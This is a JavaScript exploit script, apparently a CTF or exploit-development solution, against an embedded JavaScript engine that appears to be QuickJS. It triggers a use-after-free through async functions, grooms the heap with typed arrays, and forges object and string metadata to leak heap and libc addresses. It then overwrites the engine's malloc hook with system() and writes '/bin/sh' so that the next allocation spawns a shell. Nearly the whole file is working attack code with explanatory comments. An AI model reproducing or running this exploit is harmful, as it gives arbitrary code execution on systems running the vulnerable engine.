var arr = new Uint32Array(0x140);
var str = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ";	// a JSString that occupies an 0x50-sized chunk
var uaf_arr;
var objs;

// async function to decrease refcount of arr
async function fn1() {
	console.log("fn1");
	return arr;
}

// async function to decrease refcount of str
async function fn2() {
	console.log("fn2");
	return str;
}

fn1().then(() => {
	// Math.min(arr);
	fn1().then(() => {
		// 'arr' gets freed here, but we still have a reference to it.
		
		// Do not use Math.min(arr) to break, because it tries to increase the refcount of 'arr'
		// (i.e. the fd pointer of the currently fastbin chunk) and it will corrupt fastbin list in the heap
		// and cause libc malloc security checks to abort the program later.
		// Math.min(1);	// break to inspect the heap layout.

		// allocate objects on the heap to bring the freed 'arr' memory near the top of tcachebin
		// The for loop below should be executed 6 or 7 times based on weird
		// side effects of other parts of the program that change the heap/gc layout.
		// So, in the exploit development process it was necessary several times to adjust this value
		// to make sure that the backing storage of uaf_arr points to arr's JSObject struct exactly.
		objs = [];
		for (let i = 0; i < 6; i++) {
			objs.push({a: 1});
		}

		uaf_arr = new Uint32Array(18);	// allocate an array whose data pointer points to the freed object metadata of 'arr'
		// Math.min(uaf_arr);

		// set fake object metadata for 'arr'
		uaf_arr[0] = 10;		// large refcount to prevent it from being freed by the gc later
		uaf_arr[1] = 0x001b0d00;	// class_id of Uint32Array and some flags similar to what uaf_arr has
		uaf_arr[0x10] = 0x10000000;	// a huge length value (the .u.array.count field of JSObject)

		fn2().then(() => {
			// Math.min(str);
			fn2().then(() => {
				// 'str' gets freed here while we still have a reference to it.

				// allocate more objects to bring str's freed memory near the top of tcachebin
				for (let i = 0; i < 6; i++) {
					objs.push({a: 1});
				}

				// allocate a typed array with its data pointer pointing to str's freed memory (freed JSString struct)
				var uaf_str_arr = new Uint32Array(18);
				// Math.min(uaf_str_arr);

				// set metadata of the JSString struct
				uaf_str_arr[0] = 2;	// large refcount to avoid it getting freed by gc
				uaf_str_arr[1] = 0x10000000;	// huge length
				uaf_str_arr[2] = 0x497f93b1;	// some metadata I copied from original 'str'
				uaf_str_arr[3] = 0x4b;			// some metadata I copied from original 'str'

				// helper function to read a dword at an offset from str's content buffer (JSString str8 field)
				const read_dword = (offset) => {
					let result = 0;
					for (let i = 3; i >= 0; i--) {
						result = (result << 8) | str.charCodeAt(offset + i);
					}
					return result;
				};

				// leak the heap base low and high dwords by reading them from the heap
				let heap_base_high = read_dword(0x54);
				let heap_base_low = read_dword(0x50) - 0xd60;
				console.log(heap_base_high.toString(16));
				console.log(heap_base_low.toString(16));

				// set the 'shape' property of 'arr' to the middle of an area with zeros.
				// this will prevent segfaults in find_own_property which is an inlined function called
				// by JS_SetPropertyInternal when performing writes to an index of arr
				uaf_arr[6] = heap_base_low + 0x200;
				uaf_arr[7] = heap_base_high;

				// set the data pointer of arr to point to the heap base
				uaf_arr[0xe] = heap_base_low;
				uaf_arr[0xf] = heap_base_high;

				// leak (main_arena+96), which is a libc address, by reading it off the heap
				let libc_leak_low = read_dword(0x100);
				let libc_leak_high = read_dword(0x104);
				console.log(libc_leak_high.toString(16));
				console.log(libc_leak_low.toString(16));

				// Math.min(uaf_arr);

				// set ctx->rt->mf->js_malloc to system()
				arr[0xa8] = libc_leak_low - 0x1a9a50;	// libc-dependant offset
				arr[0xa9] = libc_leak_high;

				// write "/bin/sh\0" at ctx->rt->malloc_state's location, which gets passed to js_malloc as the first argument
				arr[0xb0] = 0x6e69622f;
				arr[0xb1] = 0x0068732f;

				// trigger js_malloc, which will now do system("/bin/sh")
				var x = {a: 1};
			});
		});
	});
});
